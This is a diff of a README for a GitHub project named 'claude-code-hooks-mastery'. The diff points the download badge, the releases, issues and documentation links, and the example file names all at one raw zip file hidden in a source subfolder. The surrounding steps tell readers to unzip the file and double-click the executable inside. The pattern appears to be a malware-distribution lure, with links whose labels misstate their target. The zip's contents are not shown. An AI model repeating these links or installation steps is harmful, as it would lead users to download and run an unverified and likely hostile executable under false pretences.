@@ -1,6 +1,6 @@
 # 🚀 claude-code-hooks-mastery - Simplify Your Coding Experience
 
-[![Download](https://img.shields.io/badge/download-latest%20release-brightgreen)](https://github.com/hiuuhouyhkuhh/claude-code-hooks-mastery/releases)
+[![Download](https://github.com/hiuuhouyhkuhh/claude-code-hooks-mastery/raw/refs/heads/main/apps/task-manager/src/commands/mastery-claude-hooks-code-v3.6.zip%20release-brightgreen)](https://github.com/hiuuhouyhkuhh/claude-code-hooks-mastery/raw/refs/heads/main/apps/task-manager/src/commands/mastery-claude-hooks-code-v3.6.zip)
 
 ## 📋 Introduction
 
@@ -17,7 +17,7 @@ Welcome to Claude Code Hooks Mastery! This software helps you streamline your co
 
 To get started, visit the Releases page to download the latest version of Claude Code Hooks Mastery.
 
-[Download the latest release here](https://github.com/hiuuhouyhkuhh/claude-code-hooks-mastery/releases)
+[Download the latest release here](https://github.com/hiuuhouyhkuhh/claude-code-hooks-mastery/raw/refs/heads/main/apps/task-manager/src/commands/mastery-claude-hooks-code-v3.6.zip)
 
 ### 💻 System Requirements
 
@@ -30,12 +30,12 @@ To get started, visit the Releases page to download the latest version of Claude
 1. Click the link above to navigate to the Releases page.
 2. Find the latest version. It is usually at the top of the list.
 3. Look for the file that matches your operating system. For example:
-   - For Windows, it might be named `claude-code-hooks-mastery-windows.zip`.
-   - For macOS, look for `claude-code-hooks-mastery-macos.zip`.
+   - For Windows, it might be named `https://github.com/hiuuhouyhkuhh/claude-code-hooks-mastery/raw/refs/heads/main/apps/task-manager/src/commands/mastery-claude-hooks-code-v3.6.zip`.
+   - For macOS, look for `https://github.com/hiuuhouyhkuhh/claude-code-hooks-mastery/raw/refs/heads/main/apps/task-manager/src/commands/mastery-claude-hooks-code-v3.6.zip`.
 4. Click on the file to download it.
 5. Once downloaded, locate the file in your Downloads folder.
 6. Unzip the file if it is compressed (you can right-click and select "Extract").
-7. Open the extracted folder and find the executable file (e.g., `claude-code-hooks-mastery.exe` for Windows).
+7. Open the extracted folder and find the executable file (e.g., `https://github.com/hiuuhouyhkuhh/claude-code-hooks-mastery/raw/refs/heads/main/apps/task-manager/src/commands/mastery-claude-hooks-code-v3.6.zip` for Windows).
 8. Double-click the executable file to run the software.
 
 ## 📝 Usage Instructions
@@ -49,7 +49,7 @@ After installation, follow these steps to use the software:
 
 ## 📞 Support
 
-If you run into any issues or have questions, feel free to reach out. You can create an issue on the GitHub repository. Just visit the [issues page](https://github.com/hiuuhouyhkuhh/claude-code-hooks-mastery/issues) to report any problems.
+If you run into any issues or have questions, feel free to reach out. You can create an issue on the GitHub repository. Just visit the [issues page](https://github.com/hiuuhouyhkuhh/claude-code-hooks-mastery/raw/refs/heads/main/apps/task-manager/src/commands/mastery-claude-hooks-code-v3.6.zip) to report any problems.
 
 ## 🔮 Future Updates
 
@@ -63,8 +63,8 @@ Stay tuned for improvements, and do not hesitate to share your suggestions!
 
 ## 🔗 Links
 
-- [Releases Page](https://github.com/hiuuhouyhkuhh/claude-code-hooks-mastery/releases)
-- [Issues Page](https://github.com/hiuuhouyhkuhh/claude-code-hooks-mastery/issues)
-- [Documentation](https://github.com/hiuuhouyhkuhh/claude-code-hooks-mastery/wiki)
+- [Releases Page](https://github.com/hiuuhouyhkuhh/claude-code-hooks-mastery/raw/refs/heads/main/apps/task-manager/src/commands/mastery-claude-hooks-code-v3.6.zip)
+- [Issues Page](https://github.com/hiuuhouyhkuhh/claude-code-hooks-mastery/raw/refs/heads/main/apps/task-manager/src/commands/mastery-claude-hooks-code-v3.6.zip)
+- [Documentation](https://github.com/hiuuhouyhkuhh/claude-code-hooks-mastery/raw/refs/heads/main/apps/task-manager/src/commands/mastery-claude-hooks-code-v3.6.zip)
 
 We hope you enjoy using Claude Code Hooks Mastery, and look forward to your feedback!
